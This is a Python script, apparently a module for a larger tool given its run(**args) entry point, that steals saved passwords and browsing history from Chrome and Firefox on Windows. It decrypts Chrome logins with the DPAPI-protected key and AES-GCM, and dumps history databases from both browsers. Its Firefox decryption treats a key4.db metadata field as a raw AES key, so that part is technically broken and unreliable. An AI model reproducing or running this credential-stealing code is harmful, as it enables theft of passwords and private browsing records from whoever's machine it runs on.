import os
import sqlite3
import json
import base64
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt

# ================= FIREFOX FUNCTIONS =================

def decrypt_firefox_password(encrypted_password, key):
    """
    Decrypts a Firefox-encrypted password using the given encryption key.
    """
    try:
        iv = encrypted_password[:16]  # First 16 bytes are the IV
        ciphertext = encrypted_password[16:]  # The rest is the ciphertext
        decryptor = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        ).decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return decrypted.strip().decode('utf-8')  # Remove padding and decode
    except Exception as e:
        return f"Error decrypting password: {e}"


def get_firefox_key():
    """
    Retrieves the decryption key from Firefox's key4.db file.
    """
    try:
        key_db_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        profiles = [p for p in os.listdir(key_db_path) if os.path.isdir(os.path.join(key_db_path, p))]
        for profile in profiles:
            key_file_path = os.path.join(key_db_path, profile, "key4.db")
            if os.path.exists(key_file_path):
                conn = sqlite3.connect(key_file_path)
                cursor = conn.cursor()
                cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password';")
                key_data = cursor.fetchone()
                conn.close()
                return base64.b64decode(key_data[1])  # Return the decoded key
        return None
    except Exception as e:
        print(f"Error fetching Firefox key: {e}")
        return None


def get_firefox_passwords():
    """
    Extracts saved passwords from Firefox's logins database.
    """
    try:
        key = get_firefox_key()
        if not key:
            print("Failed to retrieve Firefox encryption key.")
            return
        
        db_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        profiles = [p for p in os.listdir(db_path) if os.path.isdir(os.path.join(db_path, p))]
        for profile in profiles:
            login_file_path = os.path.join(db_path, profile, "logins.json")
            if os.path.exists(login_file_path):
                with open(login_file_path, "r", encoding="utf-8") as f:
                    logins_data = json.load(f)
                print("=== Firefox Saved Passwords ===")
                for login in logins_data.get("logins", []):
                    encrypted_password = base64.b64decode(login["encryptedPassword"])
                    decrypted_password = decrypt_firefox_password(encrypted_password, key)
                    print(f"URL: {login['hostname']}\nUsername: {login['username']}\nPassword: {decrypted_password}\n")
    except Exception as e:
        print(f"Error fetching Firefox passwords: {e}")


def get_firefox_history():
    """
    Extracts browsing history from Firefox's places.sqlite database.
    """
    try:
        db_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        profiles = [p for p in os.listdir(db_path) if os.path.isdir(os.path.join(db_path, p))]
        for profile in profiles:
            history_file_path = os.path.join(db_path, profile, "places.sqlite")
            if os.path.exists(history_file_path):
                shutil.copy(history_file_path, "FirefoxHistory.db")  # Make a copy of the database
                conn = sqlite3.connect("FirefoxHistory.db")
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
                print("=== Firefox Browsing History ===")
                for row in cursor.fetchall():
                    print(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\nLast Visited: {row[3]}\n")
                conn.close()
                os.remove("FirefoxHistory.db")  # Clean up
    except Exception as e:
        print(f"Error fetching Firefox history: {e}")

# ================= CHROME FUNCTIONS =================

def decrypt_chrome_password(encrypted_password, key):
    """
    Decrypts a Chrome-encrypted password using the given encryption key.
    """
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            ciphertext = payload[:-16]
            tag = payload[-16:]
            decryptor = Cipher(
                algorithms.AES(key),
                modes.GCM(iv, tag),
                backend=default_backend()
            ).decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode('utf-8')
        else:
            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
    except Exception as e:
        return f"Error decrypting password: {e}"


def get_chrome_data():
    """
    Extracts saved passwords and browsing history from Chrome.
    """
    try:
        # Extract encryption key
        local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        encryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        # Extract passwords
        db_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        shutil.copyfile(db_path, "ChromeData.db")
        conn = sqlite3.connect("ChromeData.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        print("=== Chrome Saved Passwords ===")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_chrome_password(encrypted_password, encryption_key)
            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
        conn.close()
        os.remove("ChromeData.db")

        # Extract history
        history_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        shutil.copyfile(history_path, "ChromeHistory.db")
        conn = sqlite3.connect("ChromeHistory.db")
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
        print("=== Chrome Browsing History ===")
        for row in cursor.fetchall():
            print(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\nLast Visited: {row[3]}\n")
        conn.close()
        os.remove("ChromeHistory.db")
    except Exception as e:
        print(f"Error fetching Chrome data: {e}")


def run(**args):
    print("Extracting Firefox Data...")
    print("\n--- FIREFOX PASSWORDS ---")
    get_firefox_passwords()
    print("\n--- FIREFOX HISTORY ---")
    get_firefox_history()

    print("\nExtracting Chrome Data...")
    print("\n--- CHROME PASSWORDS & HISTORY ---")
    get_chrome_data()
